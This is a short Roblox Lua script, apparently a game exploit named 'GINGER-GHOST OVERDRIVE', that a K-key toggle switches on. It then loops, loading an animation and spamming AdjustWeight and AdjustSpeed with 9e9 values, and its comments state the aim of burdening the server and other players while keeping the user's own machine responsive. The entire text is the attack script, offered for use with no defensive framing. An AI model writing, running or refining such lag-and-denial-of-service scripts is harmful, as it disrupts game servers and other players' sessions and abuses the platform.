-- // GINGER-GHOST OVERDRIVE [JAN 2026] \\ --
local active = false
local player = game.Players.LocalPlayer
local confusionId = "rbxassetid://15264639453"

game:GetService("UserInputService").InputBegan:Connect(function(i, g)
    if not g and i.KeyCode == Enum.KeyCode.K then
        active = not active
        print("Overdrive:", active)
    end
end)

-- This loop runs slower for YOU, but sends HEAVIER data to THEM
task.spawn(function()
    while true do
        if active then
            local char = player.Character
            local animator = char and char:FindFirstChildOfClass("Humanoid") and char.Humanoid:FindFirstChildOfClass("Animator")
            
            if animator then
                local a = Instance.new("Animation")
                a.AnimationId = confusionId
                local t = animator:LoadAnimation(a)
                t:Play()

                -- The "Weight Hammer"
                -- Instead of 1000 fast ones, we send 200 EXTREME math values
                for i = 1, 200 do
                    -- Huge numbers force the server's math engine to struggle
                    t:AdjustWeight(9e9) 
                    t:AdjustSpeed(9e9)
                end
                
                t:Destroy()
                a:Destroy()
            end
        end
        -- A small wait (0.1) stops YOUR computer from freezing 
        -- while the "9e9" values keep the server busy
        task.wait(0.1) 
    end
end)
